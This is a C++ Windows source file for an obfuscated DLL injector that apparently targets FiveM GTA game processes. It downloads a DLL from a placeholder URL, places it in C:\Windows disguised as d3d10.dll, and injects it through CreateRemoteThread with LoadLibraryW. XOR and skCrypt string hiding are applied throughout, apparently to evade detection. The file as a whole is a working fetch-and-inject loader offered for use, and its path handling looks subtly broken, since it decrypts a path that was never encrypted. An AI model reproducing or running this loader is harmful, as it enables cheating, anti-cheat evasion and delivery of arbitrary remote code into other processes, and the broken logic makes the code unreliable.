#include <windows.h>
#include <urlmon.h>
#include <iostream>
#include <tlhelp32.h>
#include <string>
#include <vector>
#include "xor.hpp"
#include "skStr.hpp"

#pragma comment(lib, "urlmon.lib")

bool DownloadFile(const std::wstring& url, const std::wstring& filePath) {
    HRESULT hr = URLDownloadToFileW(NULL, url.c_str(), filePath.c_str(), 0, NULL);
    return SUCCEEDED(hr);
}

DWORD GetProcessIdByName(const std::vector<std::wstring>& processNames) {
    DWORD processId = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnapshot, &pe32)) {
            do {
                for (const auto& processName : processNames) {
                    if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) {
                        processId = pe32.th32ProcessID;
                        break;
                    }
                }
                if (processId != 0) break;
            } while (Process32Next(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }
    return processId;
}

void EncryptDecrypt(std::wstring& data, wchar_t key) {
    for (size_t i = 0; i < data.size(); i++) {
        data[i] ^= key;
    }
}

LPVOID GetFunctionAddress(const char* functionName) {
    HMODULE hKernel32 = GetModuleHandle(_xor_(L"Kernel32").c_str());
    return hKernel32 ? GetProcAddress(hKernel32, functionName) : nullptr;
}

bool InjectDll(HANDLE hProcess, const std::wstring& encryptedDllPath, bool& injectSuccess) {
    injectSuccess = false;  

    std::wstring dllPath = encryptedDllPath;
    EncryptDecrypt(dllPath, L'X'); 

    size_t pathLen = (dllPath.size() + 1) * sizeof(wchar_t);
    LPVOID remoteMemory = VirtualAllocEx(hProcess, NULL, pathLen, MEM_COMMIT, PAGE_READWRITE);
    if (!remoteMemory) {
        std::wcerr << L"Failed to allocate memory in the target process. Error code: " << GetLastError() << std::endl;
        return false;
    }

    if (!WriteProcessMemory(hProcess, remoteMemory, dllPath.c_str(), pathLen, NULL)) {
        std::wcerr << L"Failed to write DLL path to the target process. Error code: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        return false;
    }

    LPVOID loadLibraryAddr = GetFunctionAddress(_xor_("LoadLibraryW").c_str());
    if (!loadLibraryAddr) {
        std::wcerr << L"Failed to get address of LoadLibraryW. Error code: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        return false;
    }

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddr, remoteMemory, 0, NULL);
    if (!hThread) {
        std::wcerr << L"Failed to create remote thread. Error code: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        return false;
    }

    WaitForSingleObject(hThread, INFINITE);

    DWORD exitCode;
    if (GetExitCodeThread(hThread, &exitCode) && exitCode != 0) {
        injectSuccess = true;
        std::wcout << L"LoadLibraryW successful. DLL loaded at address: " << (LPVOID)exitCode << std::endl;
    }
    else {
        std::wcerr << L"Remote thread execution failed. LoadLibraryW returned NULL." << std::endl;
    }

    CloseHandle(hThread);
    VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);

    return injectSuccess;
}

int main() {

    // URL to download the DLL from and the path to save it to on the local machine (must be writable).

    std::wstring url = _xor_(L"https://website.com/pupsiklover.dll").c_str();
    std::wstring downloadPath = L"C:\\Windows\\pupsiklover.dll";

    std::wstring injectPath = L"C:\\Windows\\d3d10.dll";
    if (!DownloadFile(url, downloadPath)) {
        std::wcerr << L"Failed to download DLL from URL." << std::endl;
        return 1;
    }


    
    if (!MoveFile(downloadPath.c_str(), injectPath.c_str())) {
        std::wcerr << L"Failed to rename downloaded DLL. Error code: " << GetLastError() << std::endl;
        return 1;
    }
    

    std::vector<std::wstring> processNames = {
        skCrypt(L"FiveM_b1604_GTAProcess.exe").decrypt(),
        skCrypt(L"FiveM_b2060_GTAProcess.exe").decrypt(),
        skCrypt(L"FiveM_b2189_GTAProcess.exe").decrypt(),
        skCrypt(L"FiveM_b2372_GTAProcess.exe").decrypt(),
        skCrypt(L"FiveM_b2545_GTAProcess.exe").decrypt(),
        skCrypt(L"FiveM_b2612_GTAProcess.exe").decrypt(),
        skCrypt(L"FiveM_b2699_GTAProcess.exe").decrypt(),
        skCrypt(L"FiveM_b2802_GTAProcess.exe").decrypt(),
        skCrypt(L"FiveM_b2944_GTAProcess.exe").decrypt(),
        skCrypt(L"FiveM_b3095_GTAProcess.exe").decrypt(),
        skCrypt(L"FiveM_b1604_GameProcess.exe").decrypt(),
        skCrypt(L"FiveM_b2060_GameProcess.exe").decrypt(),
        skCrypt(L"FiveM_b2189_GameProcess.exe").decrypt(),
        skCrypt(L"FiveM_b2372_GameProcess.exe").decrypt(),
        skCrypt(L"FiveM_b2545_GameProcess.exe").decrypt(),
        skCrypt(L"FiveM_b2612_GameProcess.exe").decrypt(),
        skCrypt(L"FiveM_b2699_GameProcess.exe").decrypt(),
        skCrypt(L"FiveM_b2802_GameProcess.exe").decrypt(),
        skCrypt(L"FiveM_b2944_GameProcess.exe").decrypt(),
        skCrypt(L"FiveM_b3095_GameProcess.exe").decrypt(),
    };

    EncryptDecrypt(injectPath, L'X');

    DWORD processId = GetProcessIdByName(processNames);
    if (!processId) {
        std::wcerr << L"Cannot find process." << std::endl;
        return 1;
    }
    std::wcout << L"Process ID found: " << processId << std::endl;

    std::wcout << L"Opening process..." << std::endl;
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (!hProcess) {
        std::wcerr << L"Cannot open process. Error code: " << GetLastError() << std::endl;
        return 1;
    }
    std::wcout << L"Process opened successfully." << std::endl;

    bool injectSuccess = false;
    std::wcout << L"Injecting DLL..." << std::endl;
    if (!InjectDll(hProcess, injectPath, injectSuccess)) {
        std::wcerr << L"Injection failed." << std::endl;
    }

    std::wcout << L"Injection completed " << (injectSuccess ? L"successfully." : L"with errors.") << std::endl;

    CloseHandle(hProcess);
    return injectSuccess ? 0 : 1;
}
